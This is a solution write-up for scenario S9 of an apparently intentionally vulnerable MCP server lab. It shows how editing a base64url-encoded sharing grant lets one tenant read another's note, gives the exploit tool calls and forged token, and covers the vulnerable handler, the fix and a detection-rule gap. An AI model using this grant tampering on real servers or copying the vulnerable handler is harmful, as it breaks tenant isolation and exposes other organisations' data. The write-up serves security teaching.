# Solution S9 — The Grant You Can Edit

## The exploit

Authenticate as Alice (`alice-token`, org *Acme*) and prepare a grant for her
own note:

```json
{
  "name": "note_share_prepare",
  "arguments": { "token": "alice-token", "id": "n_acme_1" }
}
```

The response is a single opaque string:

```json
{ "grant": "eyJub3RlSWQiOiJuX2FjbWVfMSJ9" }
```

It is base64url. Decode it:

```json
{ "noteId": "n_acme_1" }
```

Edit the `noteId` field to point at Globex's note, and re-encode:

```json
{ "noteId": "n_globex_1" }
```

→ `eyJub3RlSWQiOiJuX2dsb2JleF8xIn0`

Redeem the tampered grant, still authenticated as Alice:

```json
{
  "name": "note_share_redeem",
  "arguments": { "token": "alice-token", "grant": "eyJub3RlSWQiOiJuX2dsb2JleF8xIn0" }
}
```

In `LAB_S9=vuln` the server returns Globex's note in full. No cryptography
was needed — the grant is a plain base64url-encoded JSON string, not a
cryptographically signed token.

## Why it works

`note_share_redeem` in `src/tools.js` (vuln mode):

```js
guard(async ({ token, grant }) => {
  const session = resolveSession(store, token);
  const decoded = JSON.parse(Buffer.from(grant, "base64url").toString("utf8"));
  if (modes.s9 === "vuln") {
    const note = store.getNote(decoded.noteId);
    if (!note) notFound(decoded.noteId);
    return ok(note);
  }
  ...
}),
```

The session is resolved (`resolveSession(store, token)`), but it is never
checked against the note the decoded grant names. The implicit assumption is
"the grant must have come from `note_share_prepare`, and that tool already
authorized it" — but a grant is just a string that travels through the
client between the two calls. Nothing about `note_share_redeem` verifies the
grant it receives is the *same* grant `note_share_prepare` produced, still
less that it was produced *for this session*.

## Why this is MCP-specific

In an MCP server there is **no server-side continuity between two `tools/call`
invocations**. Every value that crosses the gap between `note_share_prepare`
and `note_share_redeem` travels through the client — and in an agentic
pipeline, through the calling model's own context, where it can be
paraphrased, reconstructed, or edited by a manipulated or careless model
without any cryptographic tampering at all. "A prior tool already checked
this" is a *client-side claim*, not a server-verified fact. A traditional
web session keeps that kind of continuity on the server by default (a
session object, a database row); an MCP tool chain does not, and this
scenario is what happens when a handler assumes it does anyway.

There is a second-order lesson worth taking even past the fix below: **even
a cryptographically signed grant is not enough on its own** if the redeeming
tool trusts the signed payload instead of re-checking it against the current
session. A signature proves the grant was not *forged* — it proves nothing
about whether it should still be honored for *this* caller, *this* object,
*right now*. The authority has to live in the session, not in the token.

## The fix

`LAB_S9=fixed` treats the decoded grant as a **hint**, not an authorization,
and re-checks the resolved note against the current session:

```js
const note = store.getNote(decoded.noteId);
if (!note) notFound(decoded.noteId);
requireOrgAccess(session, note);   // <-- THE FIX
return ok(note);
```

Now redeeming a tampered grant for `n_globex_1` while authenticated as Alice
is denied — `AuthzError: cross-tenant access denied`. Alice can still redeem
a grant for her own note without any change, so the fix does not over-block
legitimate use of the sharing flow.

## Detection

No new rule was written for this scenario. Measured before deciding that:
`mcp-missing-object-authz-check` (S1's rule) already fires on this exact
handler shape — `$SESSION = resolveSession(...); ...; $OBJ =
store.getNote($ID); ...; return ok($OBJ);` with no `requireOrgAccess` call in
between is exactly the pattern S1's rule targets, and `note_share_redeem`'s
vuln branch is that pattern with `decoded.noteId` in place of a directly
client-supplied id. A probe file with three functions — the vuln shape with
a local assignment, the fixed shape, and an inline (assignment-free) spelling
of the vuln shape — confirmed it: the assignment-carrying vuln function is
flagged, the fixed function stays silent, and the inline spelling
(`return ok(store.getNote(decoded.noteId))`, no local variable) is **not**
caught by any rule in the set. If your own server writes this handler
without an intermediate variable, `mcp-missing-object-authz-check` will miss
it the same way it misses S1 written that way — see `detection/README.md`
for the honest accounting.
